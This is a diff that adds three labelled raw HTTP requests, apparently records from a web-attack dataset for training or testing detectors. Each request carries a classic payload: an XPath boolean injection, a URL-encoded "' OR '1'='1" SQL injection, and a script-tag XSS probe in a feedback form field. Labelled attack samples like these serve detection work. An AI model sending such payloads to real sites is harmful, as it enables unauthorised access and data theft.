@@ -1,0 +1,36 @@
+Start - Id: 48769
+class: XPathInjection
+GET /lqlehaRus4/wREtSesTncl9tln/item.cfm?sMcu=140+++or+++1%3C+++1 HTTP/1.1
+Host: www.3afie.st:412
+Connection: dasq17e
+Accept: */*
+Client-ip: 232.245.220.245
+Cookie: zed=140547;TITexec=183
+Connection: close
+
+null
+
+End - Id: 48769
+Start - Id: 50001
+class: SqlInjection
+GET /shop/item.cfm?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1
+Host: www.3afie.st:412
+Accept: */*
+Client-ip: 232.245.220.245
+Cookie: zed=140547;TITexec=183
+Connection: close
+
+null
+
+End - Id: 50001
+Start - Id: 50002
+class: XSS
+POST /shop/feedback HTTP/1.1
+Host: www.3afie.st:412
+Content-Type: application/x-www-form-urlencoded
+Client-ip: 232.245.220.246
+Connection: close
+
+comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+End - Id: 50002
